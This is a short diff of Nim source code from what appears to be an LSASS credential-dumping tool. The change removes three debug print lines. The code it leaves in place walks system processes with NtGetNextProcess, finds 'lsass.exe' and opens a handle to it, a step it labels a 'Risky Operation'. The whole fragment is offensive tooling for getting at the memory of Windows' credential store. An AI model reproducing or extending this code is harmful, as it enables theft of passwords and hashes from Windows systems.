@@ -284,14 +284,11 @@ when isMainModule:
         echo "[-] No Suitable Handles Could Be Duplicated.\n\n[!] Attempting Risky Operation: Opening Handle Directly to Lsass Process...\n"
 
         while NtGetNextProcess(victimHandle, MAXIMUM_ALLOWED, 0, 0, addr victimHandle) == 0:
-            echo "Handle: ", victimHandle
 
             if GetProcessImageFileNameA(victimHandle, procName, MAX_PATH) == 0:
-                echo procName
                 echo "[-] Failed to Retrieve Process Name! Error: ", GetLastError(), "\n[!] Quitting..."
                 quit(1)
 
-            echo procName
             if lstrcmpiA("lsass.exe", PathFindFileNameA(procName)) == 0:
                 pid = GetProcessId(victimHandle)
                 echo fmt"[+] Found PID {pid} and Obtained Handle {victimHandle} (0x{toHex(victimHandle)})" 
